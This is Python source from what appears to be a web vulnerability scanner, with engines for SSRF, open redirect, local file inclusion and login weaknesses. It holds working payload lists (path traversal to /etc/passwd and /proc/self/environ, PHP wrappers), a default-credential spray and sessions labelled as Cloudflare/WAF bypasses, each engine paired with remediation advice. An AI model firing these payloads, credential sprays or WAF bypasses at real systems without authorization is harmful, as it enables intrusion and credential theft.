def _ssrf_engine_sync(url: str, params: dict, forms: list, progress_cb=None) -> dict:
    """Test for SSRF and Open Redirect in URL parameters and forms."""
    result = {
        "ssrf_found":      False,
        "redirect_found":  False,
        "ssrf_param":      None,
        "ssrf_payload":    None,
        "ssrf_evidence":   None,
        "redirect_param":  None,
        "redirect_payload":None,
        "fix": [],
    }
    tid  = threading.get_ident()
    with _scan_req_lock: _scan_req_counter[tid] = 0
    sess = _make_cf_session(0)   # CF bypass
    parsed = urlparse(url)
    root = f"{parsed.scheme}://{parsed.netloc}"

    # Collect all params + form fields
    all_params = set(list(params.keys()))
    for form in forms:
        all_params.update(form["inputs"].keys())

    # Add SSRF-likely params even if not in URL
    ssrf_likely = [p for p in _SSRF_PARAMS if p in all_params or p in url.lower()]

    if progress_cb:
        progress_cb(f"🔁 SSRF: checking {len(ssrf_likely)} SSRF-likely params")

    # ── SSRF probe ────────────────────────────────────────────────────────────
    for param in ssrf_likely:
        for payload in _SSRF_PAYLOADS[:8]:   # limit to 8 for speed
            try:
                sep = "&" if "?" in url else "?"
                test_url = (url + sep + f"{param}={_urlparse.quote(payload)}"
                            if param not in params
                            else _inject_param(url, param, payload))
                r = sess.get(test_url, timeout=6, allow_redirects=False)
                body_lower = r.text.lower()

                # Detect AWS/GCP metadata response patterns
                aws_hits   = ["ami-id", "instance-id", "security-credentials", "iam/"]
                gcp_hits   = ["computeMetadata", "project-id", "service-accounts"]
                redis_hits = ["redis_version", "+PONG", "redis_mode"]
                passwd_hits= ["root:x:", "bin/bash", "daemon:"]
                lan_hits   = ["192.168", "10.0.0", "router", "gateway"]

                all_hits = aws_hits + gcp_hits + redis_hits + passwd_hits + lan_hits
                hit = next((h for h in all_hits if h.lower() in body_lower), None)

                if hit or (r.status_code == 200 and "169.254" in payload and len(r.text) > 20):
                    result["ssrf_found"]    = True
                    result["ssrf_param"]    = param
                    result["ssrf_payload"]  = payload
                    result["ssrf_evidence"] = f"Hit: '{hit}' in response | Status: {r.status_code}"
                    break

                # Internal IP response (any 200 from internal = suspicious)
                if r.status_code == 200 and any(
                    p in payload for p in ["127.0.0.1", "localhost", "192.168", "10.0.0"]):
                    if len(r.text) > 50:
                        result["ssrf_found"]    = True
                        result["ssrf_param"]    = param
                        result["ssrf_payload"]  = payload
                        result["ssrf_evidence"] = f"Internal IP responded with {len(r.text)} chars"
                        break
            except Exception:
                continue
        if result["ssrf_found"]:
            break

    # ── Open Redirect probe ───────────────────────────────────────────────────
    redir_params = [p for p in all_params
                    if any(kw in p.lower() for kw in
                           ["redirect","return","next","url","dest","go","continue","target"])]

    if progress_cb and redir_params:
        progress_cb(f"🔀 Open Redirect: {len(redir_params)} params")

    for param in redir_params:
        for payload in _OPEN_REDIRECT_PAYLOADS:
            try:
                test_url = _inject_param(url, param, payload) if param in params else \
                           url + ("&" if "?" in url else "?") + f"{param}={_urlparse.quote(payload)}"
                r = sess.get(test_url, timeout=6, allow_redirects=False)
                loc = r.headers.get("Location", "")
                if r.status_code in (301, 302, 303, 307, 308) and "evil.com" in loc:
                    result["redirect_found"]   = True
                    result["redirect_param"]   = param
                    result["redirect_payload"] = payload
                    result["redirect_evidence"]= f"Redirects to: {loc}"
                    break
            except Exception:
                continue
        if result["redirect_found"]:
            break

    # ✅ v51 FIX: SSRF/Redirect fix ကို vulnerable ဖြစ်မှသာ assign
    if result.get("ssrf_found") or result.get("redirect_found"):
        result["fix"] = [
            "SSRF: Allowlist outgoing URLs — only permit specific domains",
            "SSRF: Block private IP ranges (127.x, 10.x, 172.16-31.x, 192.168.x)",
            "SSRF: Disable unused URL schemes (file://, dict://, gopher://)",
            "SSRF: If AWS — use IMDSv2 (requires token header, blocks SSRF)",
            "Open Redirect: Validate redirect URL against allowlist",
            "Open Redirect: Use relative paths only or a signed redirect token",
        ]
    return result


# ─────────────────────────────────────────────────────────────────────────────
# 📁  LFI / Path Traversal Engine
# ─────────────────────────────────────────────────────────────────────────────

_LFI_PAYLOADS = [
    # Linux targets
    ("../../../etc/passwd",                         "/etc/passwd"),
    ("../../../../etc/passwd",                      "/etc/passwd"),
    ("../../../../../etc/passwd",                   "/etc/passwd"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",    "/etc/passwd URL-enc"),
    ("..%2f..%2f..%2fetc%2fpasswd",                "/etc/passwd partial enc"),
    ("....//....//....//etc/passwd",               "/etc/passwd double-dot"),
    ("..\\..\\..\\etc\\passwd",                    "/etc/passwd backslash"),
    ("/etc/passwd",                                 "/etc/passwd absolute"),
    ("/etc/hosts",                                  "/etc/hosts"),
    ("/proc/self/environ",                          "Process environment"),
    ("/var/log/nginx/access.log",                   "Nginx access log"),
    ("/var/log/apache2/access.log",                 "Apache access log"),
    # Windows targets
    ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "Windows hosts"),
    ("C:\\Windows\\system32\\drivers\\etc\\hosts",         "Windows hosts abs"),
    ("%c0%af%c0%af%c0%afetc%c0%afpasswd",           "UTF-8 overlong"),
    # PHP wrappers
    ("php://filter/convert.base64-encode/resource=index.php", "PHP filter b64"),
    ("php://input",                                 "PHP input stream"),
    ("phar://",                                     "PHP phar wrapper"),
    ("data://text/plain,<?php phpinfo()?>",         "PHP data URI"),
]

_LFI_SUCCESS_PATTERNS = [
    "root:x:0:0",            # /etc/passwd
    "daemon:x:",
    "[boot loader]",          # Windows boot.ini
    "# localhost",            # /etc/hosts
    "for 16-bit app support", # win
    "USER=",                  # /proc/self/environ
    "PATH=",
    "DB_PASSWORD",
    "<?php",                  # PHP source disclosed
    "base64",                 # PHP filter output
]

_LFI_PARAMS = ["file", "page", "path", "include", "module", "template",
               "view", "load", "read", "dir", "folder", "doc", "document",
               "content", "source", "layout", "lang", "locale", "f", "p"]

def _lfi_engine_sync(url: str, params: dict, progress_cb=None) -> dict:
    result = {
        "vulnerable": False,
        "param":      None,
        "payload":    None,
        "target":     None,
        "evidence":   None,
        "fix":        [],
    }
    tid  = threading.get_ident()
    with _scan_req_lock: _scan_req_counter[tid] = 0
    sess = _make_cf_session(0)  # CF bypass

    # Collect LFI-likely params
    all_p = list(params.keys())
    lfi_likely = [p for p in _LFI_PARAMS if p in all_p or p in url.lower()]
    # Also test any param whose value looks like a filename
    for p, v in params.items():
        if any(ext in str(v) for ext in [".php", ".html", ".txt", ".log", "/"]):
            if p not in lfi_likely:
                lfi_likely.append(p)
    # Fallback: test any param
    if not lfi_likely:
        lfi_likely = list(params.keys())[:3]

    if progress_cb:
        progress_cb(f"📁 LFI: {len(lfi_likely)} params × {len(_LFI_PAYLOADS)} payloads")

    for param in lfi_likely:
        for payload, target_desc in _LFI_PAYLOADS:
            try:
                test_url = _inject_param(url, param, payload) if param in params else \
                           url + ("&" if "?" in url else "?") + f"{param}={_urlparse.quote(payload)}"
                r = _throttled_get(sess, test_url, tid, allow_redirects=True)
                body = r.text

                # Decode PHP filter base64 output
                decoded_body = body
                if "base64-encode" in payload and len(body.strip()) > 20:
                    try:
                        import base64 as _b64
                        raw_b64 = body.strip().split()[-1]
                        decoded = _b64.b64decode(raw_b64 + "==").decode("utf-8", errors="replace")
                        if "<?php" in decoded or "<?=" in decoded or len(decoded) > 50:
                            decoded_body = decoded
                            result["php_source_disclosed"] = True
                    except Exception:
                        pass

                hit = next((p for p in _LFI_SUCCESS_PATTERNS if p in decoded_body), None)
                # Also check if we got any substantial b64 blob (PHP filter)
                if not hit and "base64-encode" in payload and len(body.strip()) > 100:
                    if re.match(r"^[A-Za-z0-9+/=\s]+$", body.strip()):
                        hit = "base64_blob"  # likely PHP source
                if hit:
                    idx = decoded_body.find(hit) if hit != "base64_blob" else 0
                    evidence = decoded_body[max(0,idx-10):idx+200].strip()
                    if hit == "base64_blob":
                        evidence = f"PHP source (base64): {body.strip()[:80]}..."
                    result.update({
                        "vulnerable": True,
                        "param":      param,
                        "payload":    payload,
                        "target":     target_desc,
                        "evidence":   evidence[:300],
                        "poc":        f"curl -s '{test_url}' | head -5",
                    })
                    return result
            except Exception:
                continue

        # ✅ v51 FIX: LFI fix ကို vulnerable ဖြစ်မှသာ assign
    if result.get("vulnerable"):
        result["fix"] = [
            "Never pass user input directly to file open functions",
            "Use basename() to strip path components: `basename($_GET[\'file\'])`",
            "Whitelist allowed files: `$allowed=[\'home\',\'about\']; if(!in_array($file,$allowed)) die();`",
            "Disable PHP wrappers if unused: `allow_url_include=Off` in php.ini",
            "Use realpath() + str_starts_with() to enforce base directory",
            "Chroot jail / open_basedir to restrict filesystem access",
        ]
    return result


# ─────────────────────────────────────────────────────────────────────────────
# 🔐  Auth Weakness Engine
# ─────────────────────────────────────────────────────────────────────────────

_COMMON_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "admin123"), ("root", "root"), ("root", "toor"),
    ("admin", ""), ("test", "test"), ("user", "user"), ("guest", "guest"),
    ("admin", "pass"), ("administrator", "administrator"),
]

def _auth_engine_sync(url: str, forms: list, progress_cb=None) -> dict:
    """
    Test auth weaknesses:
    1. Default credential spray (limited, respectful)
    2. Rate limiting check (does it lockout after N fails?)
    3. Session security (cookie flags, expiry)
    4. JWT exposure in response
    5. CSRF token absence in login forms
    """
    result = {
        "default_creds":   False,
        "no_rate_limit":   False,
        "weak_session":    [],    # missing cookie flags
        "csrf_missing":    False,
        "jwt_in_response": False,
        "login_form":      None,
        "poc_cred":        None,
        "fix":             [],
    }
    # Use CF bypass session to handle WAF-protected login pages
    sess = _make_cf_session(0)
    sess.verify = False

    # Find login form
    login_form = None
    for form in forms:
        inputs = form["inputs"]
        has_pass = any("pass" in k.lower() or k.lower() in ("pwd","pw") for k in inputs)
        has_user = any(k.lower() in ("username","user","email","login","name") for k in inputs)
        if has_pass and has_user:
            login_form = form
            break

    if not login_form:
        # Try /login, /signin pages
        for path in ["/login", "/signin", "/wp-login.php", "/admin/login", "/auth"]:
            try:
                r = sess.get(url.rstrip("/") + path, timeout=6)
                if r.status_code == 200:
                    sub_forms = _parse_forms(r.text, r.url)
                    for form in sub_forms:
                        inputs = form["inputs"]
                        has_pass = any("pass" in k.lower() for k in inputs)
                        has_user = any(k.lower() in ("username","user","email","login") for k in inputs)
                        if has_pass and has_user:
                            login_form = form
                            break
                if login_form:
                    break
            except Exception:
                continue

    result["login_form"] = login_form["action"] if login_form else None

    if login_form:
        if progress_cb:
            progress_cb(f"🔐 Auth: testing {len(_COMMON_CREDS)} default creds...")

        # Find field names
        user_field = next((k for k in login_form["inputs"]
                          if k.lower() in ("username","user","email","login","name")), None)
        pass_field = next((k for k in login_form["inputs"]
                          if "pass" in k.lower() or k.lower() in ("pwd","pw")), None)

        # Check CSRF token
        has_csrf = any(
            "csrf" in k.lower() or "token" in k.lower() or "_token" in k.lower()
            for k in login_form["inputs"]
        )
        result["csrf_missing"] = not has_csrf

        if user_field and pass_field:
            # Baseline: failed login response
            baseline_data = dict(login_form["inputs"])
            baseline_data[user_field] = "definitely_invalid_user_xyzzy"
            baseline_data[pass_field] = "definitely_invalid_pass_xyzzy"
            try:
                r0 = sess.post(login_form["action"], data=baseline_data, timeout=8)
                baseline_len = len(r0.text)
                baseline_status = r0.status_code
            except Exception:
                baseline_len = 0
                baseline_status = 0

            # ── Default cred spray (max 6 attempts to be respectful) ──────────
            for username, password in _COMMON_CREDS[:6]:
                try:
                    data = dict(login_form["inputs"])
                    data[user_field] = username
                    data[pass_field] = password
                    r = sess.post(login_form["action"], data=data, timeout=8,
                                  allow_redirects=True)
                    # Success indicators: redirect to dashboard, different page
                    success = (
                        r.status_code in (200, 302)
                        and abs(len(r.text) - baseline_len) > 500
                        and not any(w in r.text.lower()
                                    for w in ["invalid","incorrect","failed","error","wrong"])
                        and any(w in r.text.lower()
                                for w in ["dashboard","logout","welcome","profile","admin","account"])
                    )
                    if success:
                        result["default_creds"] = True
                        result["poc_cred"] = f"{username}:{password}"
                        break
                except Exception:
                    continue

            # ── Rate limit check (send 10 bad creds, see if we get blocked) ───
            if progress_cb:
                progress_cb("🔐 Auth: rate limit check...")
            blocked = False
            for _ in range(10):
                try:
                    data = dict(login_form["inputs"])
                    data[user_field] = "ratelimitcheck_user"
                    data[pass_field] = "ratelimitcheck_pass"
                    r = sess.post(login_form["action"], data=data, timeout=6)
                    if r.status_code in (429, 403) or "locked" in r.text.lower() \
                            or "too many" in r.text.lower():
                        blocked = True
                        break
                except Exception:
                    break
            result["no_rate_limit"] = not blocked

    # ── Session cookie security ───────────────────────────────────────────────
    try:
        r = sess.get(url, timeout=8)
        weak_cookies = []
        for cookie in r.cookies:
            issues = []
            if not cookie.secure:
                issues.append("no Secure flag")
            if not cookie.has_nonstandard_attr("HttpOnly") and "httponly" not in str(cookie).lower():
                issues.append("no HttpOnly flag")
            samesite = cookie._rest.get("SameSite", "") if hasattr(cookie, "_rest") else ""
            if not samesite:
                issues.append("no SameSite")
            if issues:
                weak_cookies.append(f"{cookie.name}: {', '.join(issues)}")
        result["weak_session"] = weak_cookies

        # JWT in response body or headers
        body = r.text
        jwt_pattern = r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+'
        jwt_hits = re.findall(jwt_pattern, body)
        if jwt_hits:
            result["jwt_in_response"] = True
            result["jwt_sample"] = jwt_hits[0][:60] + "..."
    except Exception:
        pass

        # ✅ v51 FIX: Auth fix ကို vulnerable ဖြစ်မှသာ assign
    is_auth_vuln = (result.get("default_creds") or result.get("no_rate_limit")
                    or result.get("no_csrf") or result.get("no_logout")
                    or result.get("session_fixation") or result.get("weak_password"))
    if is_auth_vuln:
        result["fix"] = [
            "Default creds: Force password change on first login, remove default accounts",
            "Rate limiting: Lock account after 5 failed attempts for 15 minutes",
            "Rate limiting: Add `429 Too Many Requests` response after threshold",
            "Session: Set `Secure; HttpOnly; SameSite=Strict` on all cookies",
            "CSRF: Include CSRF token in all state-changing forms",
            "JWT: Never expose JWT in HTML response — use httpOnly cookie",
            "Password: Enforce minimum 12 chars + complexity + HIBP breach check",
            "MFA: Add TOTP (Google Authenticator) for admin/sensitive accounts",
        ]
    return result


